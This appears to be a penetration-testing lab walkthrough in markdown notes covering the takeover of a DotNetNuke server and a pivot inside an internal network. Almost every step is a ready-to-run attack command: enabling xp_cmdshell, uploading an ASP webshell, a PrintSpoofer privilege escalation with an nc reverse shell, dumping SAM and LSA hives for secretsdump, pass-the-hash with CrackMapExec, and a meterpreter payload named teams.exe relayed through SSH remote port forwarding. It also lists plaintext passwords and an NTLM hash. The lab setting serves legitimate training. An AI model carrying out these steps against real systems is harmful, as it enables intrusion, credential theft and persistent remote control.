## Attacking DNN

- Administrator:D0tn31Nuk3R0ck$$@123

Settings > SQL console
```
EXEC sp_configure 'show advanced options', '1'
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', '1' 
RECONFIGURE
```
- Run Script

```
xp_cmdshell 'whoami'
```

Settings > Security > More > More Security Settings > Allowable File Extensions
- Allow .asp and .aspx files
- Upload ASP webshell: https://raw.githubusercontent.com/backdoorhub/shell-backdoor-list/master/shell/asp/newaspcmd.asp after browsing to http://172.16.8.20/admin/file-management.
- Right-click on uploaded file and select Get URL
```
172.16.8.20/Portals/0/shell.asp?cmd-whoami+%2Fpriv
```


## Privilege Escalation

- SeImpersonate is enabled, so we can use JuicyPotato or PrintSpoofer
- Transfer printspoofer64.exe and nc.exe to dev01 host
- Start netcat listener on dmz01
```
nc -lvnp 443
```
```
c:\DotNetNuke\Portals\0\PrintSpoofer64.exe -c "c:\DotNetNuke\Portals\0\nc.exe 172.16.8.120 443 -e cmd"
```

Dump SAM and local administrator hash
```
reg save HKLM\SYSTEM SYSTEM.SAVE
reg save HKLM\SECURITY SECURITY.SAVE
reg save HKLM\SAM SAM.SAVE
```
- Allow SAVE file extension, then download files to local machine
```
secretsdump.py LOCAL -system SYSTEM.SAVE -sam SAM.SAVE -security SECURITY.SAVE
```

**Verify credentials with CrackMapExec
```
sudo proxychains crackmapexec smb 172.16.8.20 --local-auth -u administrator -H 0e20798f695ab0d04bc138b22344cea8 --lsa
```
- hporter:Gr8hambino!

**Confirm Credentials from dmz01 reverse shell
```
net user hporter /dom
```


## Reverse Port Forwarding Method

1. Create a reverse shell on attack host
- Specify dmz01 IP address as the lhost
```
msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.8.120 -f exe -o teams.exe LPORT=443
```
2. Set up a multi/handler and start a listener on a different port than the payload we generated will use
```
use multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost 0.0.0.0
set lport 7000
run
```
3. Upload reverse shell to DEV01
- Either use the DNN file manager to upload the file or scp it up to dmc01, start a python web server, then download the file from DEV01.
4. SSH remote port forwarding to forward the dmz01 pivot box port 443 to the Metasploit listener port 7000
```
ssh -i dmz01_key -R 172.16.8.120:443:0.0.0.0:7000 root@10.129.203.111 -vN
```
- R tells the pivot host to listen on port 443 and forward to 0.0.0.0:7000 configured on our attack host
5. Exploit the multi/handler on attack host and execute teams.exe on DEV01 to get a reverse shell
